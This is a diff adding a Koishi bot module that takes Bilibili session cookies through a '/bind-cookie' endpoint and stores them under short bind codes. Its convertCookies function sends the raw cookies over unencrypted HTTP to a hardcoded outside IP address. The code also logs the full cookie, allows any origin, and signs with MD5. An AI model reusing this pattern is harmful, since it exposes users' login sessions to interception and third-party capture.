@@ -1,0 +1,171 @@
+﻿import {Context} from 'koishi'
+import crypto from 'crypto'
+import {Config} from "../../index";
+import {} from '@koishijs/plugin-server'
+
+export const name = 'cookie-binder'
+
+export interface Cookie {
+    name: string;        // Cookie 名称
+    value: string;       // Cookie 值
+    domain: string;      // Cookie 域名，自动推断为 .bilibili.com
+    path: string;        // Cookie 路径，默认为 /
+    expires: number;     // 过期时间戳，从 Cookie 中解析或设置为 30 天后
+    httpOnly: boolean;   // 是否仅 HTTP 访问，重要 Cookie 设为 true
+    secure: boolean;     // 是否仅 HTTPS 传输，默认 true
+    sameSite: string;    // 同站限制策略，默认 Lax
+}
+
+interface BiliBind {
+    bindCode: number
+    cookie: string
+    cookieInfo: Cookie[],
+    createdAt: number
+}
+
+declare module 'koishi' {
+    interface Tables {
+        bili_bind: BiliBind;
+    }
+}
+
+// Cookie转换
+async function convertCookies(cookie: string): Promise<Cookie[]> {
+    try {
+        const response = await fetch("http://47.117.27.240:3000/api/convert", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cookies: cookie })
+        });
+
+        if (!response.ok) {
+            return [];
+        }
+
+        const result = await response.json();
+        return result._default['1'].value;
+    } catch (error) {
+        return [];
+    }
+}
+
+export function cookie(ctx: Context, config: Config) {
+    ctx.database.extend('bili_bind', {
+        bindCode: "unsigned",
+        cookie: 'string',
+        cookieInfo: 'json',
+        createdAt: 'unsigned',
+    }, {
+        primary: 'bindCode',
+    });
+
+    // 优化：统一设置 CORS 中间件
+    ctx.server.all("/bind-cookie", async (koaCtx: any, next) => {
+        // 设置CORS头
+        koaCtx.set('Access-Control-Allow-Origin', '*')
+        koaCtx.set('Access-Control-Allow-Methods', 'POST, OPTIONS')
+        koaCtx.set('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With')
+
+        if (koaCtx.method === 'OPTIONS') {
+            ctx.logger("cookie").info(`处理OPTIONS预检请求: ${koaCtx.path}`)
+            koaCtx.status = 200
+            return
+        }
+
+        if (koaCtx.method !== 'POST') {
+            koaCtx.status = 405
+            koaCtx.body = { error: { message: 'Method Not Allowed', type: 'invalid_request_error' } }
+            return
+        }
+
+        await next()
+    })
+
+    // 使用 router 处理 POST 请求，优化：合并 CORS 设置，改进错误处理
+    ctx.server.post('/bind-cookie', async (koaCtx: any) => {
+        try {
+            // 解析 JSON 请求体
+            let body = koaCtx.request.body;
+            if (!body) {
+                koaCtx.response.body = { error: 'Invalid JSON body' };
+                return koaCtx.status = 400;
+            }
+
+            ctx.logger("cookie").info(JSON.stringify(body));
+
+            const md5 = body["md5"];
+            const original = body["original"];
+            const cookie = body["cookie"];
+            if (!md5 || !original || !cookie) {  // 优化：同时检查 original
+                koaCtx.response.body = { error: "Missing required fields (md5, original, cookie)" };
+                return koaCtx.status = 400;
+            }
+
+            // 计算原始字符串的 MD5（如果有 secretKey，使用 HMAC；否则纯 MD5）
+            let computedHash: string
+            if (config.bili.secretKey) {
+                const hmac = crypto.createHmac('md5', config.bili.secretKey)
+                hmac.update(original)
+                computedHash = hmac.digest('hex')
+            } else {
+                computedHash = crypto.createHash('md5').update(original).digest('hex');  // 优化：明确纯 MD5
+            }
+
+            if (computedHash !== md5) {
+                koaCtx.response.body = { error: 'Invalid MD5 signature for original string' };
+                return koaCtx.status = 400;
+            }
+
+            let bindCode: number | null = null
+            let attempts = 0
+            const maxAttempts = 10  // 防止无限循环，实际中90万种可能，重复率极低
+
+            while (!bindCode && attempts < maxAttempts) {
+                const candidate = Math.floor(Math.random() * 900000) + 100000
+
+                const existing = await ctx.database.get("bili_bind", candidate)
+                if (!existing || existing.length === 0) {
+                    bindCode = candidate
+                } else {
+                    attempts++
+                }
+            }
+
+            if (!bindCode) {  // 优化：处理生成失败
+                koaCtx.response.body = { error: 'Failed to generate unique bindCode after max attempts' };
+                return koaCtx.status = 500;
+            }
+
+            const cookieInfo : Cookie[] = await convertCookies(cookie);
+            if (cookieInfo.length === 0) {  // 优化：检查转换结果
+                koaCtx.response.body = { error: 'Failed to convert cookies' };
+                return koaCtx.status = 400;
+            }
+
+            const now = Date.now();
+            await ctx.database.create("bili_bind", {
+                bindCode,
+                cookie,
+                cookieInfo,
+                createdAt: now
+            });
+
+            // 响应成功
+            koaCtx.response.body = { success: true, bindCode }
+            koaCtx.status = 200;
+        } catch (error) {
+            ctx.logger("cookie").error('Bind cookie error:', error)
+            koaCtx.response.body = { error: 'Internal server error' }
+            koaCtx.status = 500;
+        }
+    })
+
+    ctx.setInterval(async () => {  // 每小时
+        const oneHourAgo = Date.now() - 3600000;
+        const expiredRecords = await ctx.database.get('bili_bind', { createdAt: { $lt: oneHourAgo } });
+        for (const record of expiredRecords) {
+            await ctx.database.remove('bili_bind', { bindCode: record.bindCode });
+            ctx.logger('cookie').info(`自动清理过期绑定码: ${record.bindCode}`);
+        }
+    }, 7 * 24 * 60 * 60 * 1000); // 每7天运行一次
+}
